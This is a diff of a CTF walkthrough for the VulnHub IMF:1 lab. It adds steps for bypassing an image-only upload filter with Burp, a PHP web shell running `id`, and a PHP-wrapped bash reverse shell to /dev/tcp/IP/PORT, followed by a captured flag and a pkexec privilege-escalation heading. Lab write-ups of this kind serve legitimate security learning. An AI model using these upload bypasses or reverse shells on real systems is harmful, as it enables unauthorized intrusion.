@@ -53,14 +53,41 @@ echo 'dXBsb2Fkcjk0Mi5waHA=' | base64 -d
 ```
 and we obtain upload php file 
 
-and found out that we can only uploD image files
+and found out that we can only upload image files
 
 in burpsuite , we upload shell.php which you can download
 ```bash
-
+wget https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/blob/main/IMF%3A1/shell.php
 ```
+we upload this php file and in repeater -->
+content-type --> image/gif
+filename --> shell.gif
+
+but we have to change content of php file to
+
+<?php
+    echo '<pre>';
+    echo `id`;
+    echo '</pre>';
+?>
+
+in response, we obtain something like 43nfi24276f
+
+we write in url --> http://imf.local/imfadministrator/uploads/43nfi24276f.gif
+
+we change it to -->
+
+<?php
+    echo '<pre>';
+    echo `bash -i >& /dev/tcp/IP/PORT 0>&1`;
+    echo '</pre>';
+?>
+
+good , www-data shell opened and flag5 captured.
 
 flag5{YWdlbnRzZXJ2aWNlcw==}
+
+## 3. Privilege Escalation
 
 pkexec vulnerability found ---> pkexec version 0.105
 
